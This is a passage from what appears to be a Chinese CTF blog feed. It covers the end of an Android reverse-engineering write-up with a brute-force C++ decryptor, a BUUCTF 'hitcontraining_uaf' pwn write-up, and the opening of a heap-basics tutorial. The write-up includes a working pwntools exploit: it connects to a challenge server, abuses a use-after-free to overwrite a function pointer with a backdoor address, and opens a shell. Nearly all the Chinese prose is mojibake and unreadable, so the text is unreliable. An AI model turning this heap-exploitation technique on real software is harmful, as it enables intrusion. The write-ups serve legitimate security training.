string">"com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9127.png" alt="CTF - REVERSE_Android é€†å‘27.png"></p><p>ç„¶å IDA å›¾æ ‡ä¼šé—ªçƒï¼Œå›åˆ° IDA å°±å¯ä»¥æ­£å¸¸ F9ã€æ­£å¸¸ä¸‹æ–­ç‚¹äº†</p><p>è¿è¡Œåï¼Œ<code>buff</code> å­˜æ”¾çš„åœ°å€ï¼š<code>0x7FFF5A3772A0</code> å¤„ç”Ÿæˆäº†æ•°æ®</p><p>æå–å‡ºæ¥å¾—åˆ°å¯†æ–‡ï¼š<code>jm0g3&#123;djyalj&#123;4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9128.png" alt="CTF - REVERSE_Android é€†å‘28.png"></p><p>æ ¹æ®åŠ å¯†é€»è¾‘æš´åŠ›ç ´è§£ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> enc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"jm0g3&#123;djyalj&#123;4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> dec<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">56</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>                dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">45</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x30</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x19</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x19</span><span class="token punctuation">)</span>                    dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">94</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>            dec <span class="token operator">=</span> dec <span class="token operator">^</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dec <span class="token operator">==</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token number">65</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ° flagï¼š<code>fk0a7udfwylfu4ia7e9rcosqDg6b2962b572658deebQNfMr8Ssee</code></p>]]></content>
    
    
    <summary type="html">æ€»ç»“ä¸€ä¸‹å®‰å“é€†å‘ä¸­çš„ä¸€äº›çŸ¥è¯†ç‚¹ï¼ŒåŒ…æ‹¬å¦‚ä½•é™æ€åˆ†æå®‰å“ç¨‹åºï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨ IDA æ¥åŠ¨æ€è°ƒè¯•å®‰å“ç¨‹åºçš„ so æ–‡ä»¶</summary>
    
    
    
    <category term="é€†å‘å·¥ç¨‹" scheme="https://www.uf4te.cn/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
    <category term="Reverse" scheme="https://www.uf4te.cn/tags/Reverse/"/>
    
    <category term="IDA" scheme="https://www.uf4te.cn/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>ã€BUUCTFã€‘hitcontraining_uaf</title>
    <link href="https://www.uf4te.cn/posts/1cb138a7.html"/>
    <id>https://www.uf4te.cn/posts/1cb138a7.html</id>
    <published>2024-05-17T08:21:50.000Z</published>
    <updated>2024-06-05T06:36:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li><p>å †ä¸­çš„ ret2text</p></li><li><p><mark>åˆ©ç”¨ UAF æ¼æ´ï¼Œä¸¤æ¬¡ <code>free</code>ï¼Œä¸€æ¬¡ <code>malloc</code>ï¼Œç¯¡æ”¹è¢«é‡Šæ”¾çš„å †ä¸­çš„æ•°æ®ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œç„¶åå†æ‰“å°è¢«é‡Šæ”¾çš„å †å—å†…å®¹è§¦å‘åé—¨å‡½æ•°</mark></p></li></ul><hr><p><a href="https://buuoj.cn/challenges#hitcontraining_uaf">ã€BUUCTFã€‘hitcontraining_uaf</a></p><hr><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><blockquote><p>æœ¬åœ°ç¯å¢ƒï¼šGlibc 2.23</p></blockquote><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf1.png" alt="ã€BUUCTFã€‘hitcontraining_uaf1.png"></p><p>å°è¯•è¿è¡Œï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf2.png" alt="ã€BUUCTFã€‘hitcontraining_uaf2.png"></p><p>ä¸€ä¸ªç»å…¸èœå•é¢˜ï¼ŒIDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf3.png" alt="ã€BUUCTFã€‘hitcontraining_uaf3.png"></p><p>ä¸»è¦æ¼æ´å‘ç”Ÿåœ¨ <code>del_note()</code> ä¸­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf4.png" alt="ã€BUUCTFã€‘hitcontraining_uaf4.png"></p><p>é€šè¿‡ <code>free</code> é‡Šæ”¾å†…å­˜åæœªç½® 0ï¼Œå­˜åœ¨ UAF æ¼æ´</p><p>åŒæ—¶å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•° <code>magic()</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf5.png" alt="ã€BUUCTFã€‘hitcontraining_uaf5.png"></p><p>ç»“åˆ GDB è°ƒè¯•ï¼Œåˆ†æä¸€ä¸‹ <code>add_note()</code> å‡½æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf7.png" alt="ã€BUUCTFã€‘hitcontraining_uaf7.png"></p><p>éªŒè¯ä¸€ä¸‹æˆ‘ä»¬çš„åˆ†æï¼Œä½¿ç”¨ä¸€æ¬¡ <code>add_note(32, b&#39;aaaa&#39;)</code> åå †ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf9.png" alt="ã€BUUCTFã€‘hitcontraining_uaf9.png"></p><p>ç¬¬ä¸€ä¸ªå †å—æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œå®ƒæœ‰ä¸¤ä¸ªæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡å‘ <code>print_note_content()</code> å‡½æ•°ï¼Œä¸€ä¸ªæŒ‡å‘ <code>note chunk</code>ï¼Œæˆ‘ä»¬åªèƒ½æ§åˆ¶ç¬¬äºŒä¸ªå †å— <code>note chunk</code> çš„ <code>content</code></p><p>ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œç”¨å›¾è¡¨ç¤ºå‡ºæ¥å°±æ˜¯è¿™æ ·ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf8.png" alt="ã€BUUCTFã€‘hitcontraining_uaf8.png"></p><p><code>print_note()</code> å‡½æ•°ç”¨äºè¾“å‡º <code>note chunk</code> ä¸­çš„ <code>content</code> å†…å®¹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf10.png" alt="ã€BUUCTFã€‘hitcontraining_uaf10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf11.png" alt="ã€BUUCTFã€‘hitcontraining_uaf11.png"></p><blockquote><p>ç”±äºå­˜åœ¨ UAF æ¼æ´ï¼Œäºæ˜¯æˆ‘ä»¬çš„æƒ³æ³•æ˜¯è¦†ç›– <code>notelist[i][0]</code> çš„æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ <code>magic()</code> å‡½æ•°çš„åœ°å€</p><p>æˆ‘ä»¬å†é€šè¿‡ <code>print_note()</code> å‡½æ•°å°† <code>notelist[i][1]</code> æŒ‡å‘çš„ <code>note chunk</code> æ‰“å°ï¼Œå°±ä¼šè°ƒç”¨ <code>notelist[i][0]</code> æŒ‡å‘çš„ <code>magic()</code> å‡½æ•°è·å¾— shell</p></blockquote><p>é¦–å…ˆï¼Œåˆ›å»ºä¸¤ä¸ª <code>note chunk</code>ï¼ˆå®é™…ä¸Šåˆ›å»ºäº† 4 ä¸ªå †ï¼Œå› ä¸ºè¿˜æœ‰ 2 ä¸ª <code>notelist</code> å †ï¼‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf12.png" alt="ã€BUUCTFã€‘hitcontraining_uaf12.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf13.png" alt="ã€BUUCTFã€‘hitcontraining_uaf13.png"></p><p>åˆ†åˆ«é‡Šæ”¾å®ƒä»¬ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf14.png" alt="ã€BUUCTFã€‘hitcontraining_uaf14.png"></p><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬å†é€šè¿‡ <code>add_note()</code> åˆ›å»º <code>new_note chunk</code></p><p>ç”±äº <code>add_note()</code> ä¼šåˆ›å»ºä¸¤ä¸ªå †å—ï¼Œè€Œ <code>fast bin</code> æ˜¯åè¿›å…ˆå‡ºçš„ï¼Œä¼šç”³è¯·åˆ° <code>fastbin[0x10]</code> ä¸­çš„ä¸¤ä¸ª <code>fast bin</code>ï¼Œå³ <code>0x9f4d038</code> å’Œ <code>0x9f4d000</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf15.png" alt="ã€BUUCTFã€‘hitcontraining_uaf15.png"></p><p>ç„¶åæˆ‘ä»¬è¦†ç›– <code>new_note chunk</code> çš„ç¬¬ä¸€ä¸ªå†…å®¹ä¸ºåé—¨å‡½æ•° <code>magic()</code> çš„åœ°å€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf16.png" alt="ã€BUUCTFã€‘hitcontraining_uaf16.png"></p><p>ç”±äºå­˜åœ¨ UAF æ¼æ´ï¼Œä¹‹å‰ <code>free</code> æ‰çš„ <code>notelist[0]</code> å’Œ <code>note chunk 0</code> ä¾ç„¶æ˜¯å¯ä»¥ä½¿ç”¨çš„</p><p>æˆ‘ä»¬å…¶å®ç›¸å½“äºå°†ä¹‹å‰ <code>notelist[0][0]</code> æŒ‡å‘ <code>print_note_content()</code> å‡½æ•°çš„æŒ‡é’ˆç¯¡æ”¹ä¸ºäº†æŒ‡å‘ <code>magic()</code> å‡½æ•°çš„æŒ‡é’ˆ</p><p>ç„¶åè°ƒç”¨ <code>print_note()</code> å‡½æ•°ï¼Œæ‰“å°è¢« <code>free</code> æ‰çš„ <code>note chunk 0</code> çš„å†…å®¹ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡Œ <code>notelist[0][0]</code> å¤„çš„ <code>magic()</code> å‡½æ•°ï¼Œè§¦å‘åé—¨å‡½æ•°æ‹¿åˆ° shell</p><hr><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./hacknote"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hacknote"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># è¿œç¨‹ç¨‹åºçš„ IP å’Œç«¯å£å·</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27407</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note size :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content :'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>magic_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><blockquote><p>flag{6e193074-b875-4c2a-bb9d-3828320fa467}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf6.png" alt="ã€BUUCTFã€‘hitcontraining_uaf6.png"></p>]]></content>
    
    
    <summary type="html">å¯ä»¥è¯´æ˜¯å †ä¸­çš„ ret2textï¼Œä½œä¸ºå †çš„å…¥é—¨ä¾‹é¢˜å§ï¼Œåˆ©ç”¨ UAF æ¼æ´ç¯¡æ”¹è¢«é‡Šæ”¾çš„å †å—å†…å®¹ä¸ºåé—¨å‡½æ•°åœ°å€</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>å †åŸºç¡€</title>
    <link href="https://www.uf4te.cn/posts/463ab4ed.html"/>
    <id>https://www.uf4te.cn/posts/463ab4ed.html</id>
    <published>2024-05-15T12:04:36.000Z</published>
    <updated>2024-06-05T06:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h1><blockquote><p>å †ï¼ˆheapï¼‰æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œåœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜</p><p>å †æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒ<strong>ç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿ï¼ˆå’Œæ ˆçš„å¢é•¿æ–¹å‘ç›¸åï¼‰</strong>ï¼Œç®¡ç†å †çš„ç¨‹åºä¹Ÿç§°ä¸ºå †ç®¡ç†å™¨</p><p>å‚è€ƒæ–‡ç« ï¼š  </p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-overview/">å †æ¦‚è¿° - CTF Wiki</a>  </li><li><a href="https://wiki.wgpsec.org/">ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“</a></li></ol></blockquote><p>ç›®å‰ Linux æ ‡å‡†å‘è¡Œç‰ˆä¸­ä½¿ç”¨çš„å †åˆ†é…å™¨æ˜¯ Glibc ä¸­çš„å †åˆ†é…å™¨ï¼š<code>ptmalloc2</code></p><p>å †çš„åŸºæœ¬æ“ä½œæ˜¯åˆ†é…å’Œå›æ”¶ï¼Œ<code>ptmalloc2</code> ä¸»è¦é€šè¿‡ <code>malloc()</code> å’Œ <code>free()</code> å‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜å—</p><hr><h2 id="å †çš„åŸºæœ¬æ“ä½œ"><a href="#å †çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="å †çš„åŸºæœ¬æ“ä½œ"></a>å †çš„åŸºæœ¬æ“ä½œ</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><blockquote><p>å‡½æ•°å£°æ˜ï¼š<code>void *malloc(size_t size)</code></p><p><code>size</code> æ˜¯å†…å­˜å—çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½</p></blockquote><p><code>malloc()</code> çš„ä½œç”¨æ˜¯åˆ†é…æ‰€éœ€çš„å†…å­˜ç©ºé—´ï¼ˆ<em>ä¸ä¼šå¯¹å†…å­˜ç©ºé—´è¿›è¡Œåˆå§‹åŒ–</em>ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘å®ƒçš„æŒ‡é’ˆï¼›å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œåˆ™è¿”å› NULL</p><ul><li><p>å½“ <code>size = 0</code> æ—¶ï¼Œè¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å—</p></li><li><p>å½“ <code>size</code> ä¸ºè´Ÿæ•°æ—¶ï¼Œ<strong>ç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸Šï¼Œsize_t æ˜¯æ— ç¬¦å·æ•°ï¼ˆè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼‰</strong>ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…</p></li></ul><p>ä»¥ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥çœ‹çœ‹ <code>malloc()</code> å‡½æ•°å’Œå †ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡ GDB è°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ‰§è¡Œ <code>malloc()</code> å‡½æ•°å‰ï¼Œç¨‹åºçš„åœ°å€ç©ºé—´é‡Œæ˜¯æ²¡æœ‰å †çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA1.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º1.png"></p><p>æ‰§è¡Œ <code>malloc()</code> å‡½æ•°åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA2.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA3.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º3.png"></p><p>å¯è§ç¨‹åºä¸­æœ€å¼€å§‹æ˜¯æ²¡æœ‰å †è¿™éƒ¨åˆ†ç©ºé—´çš„ï¼Œåœ¨ç”¨æˆ·é€šè¿‡ <code>malloc()</code> 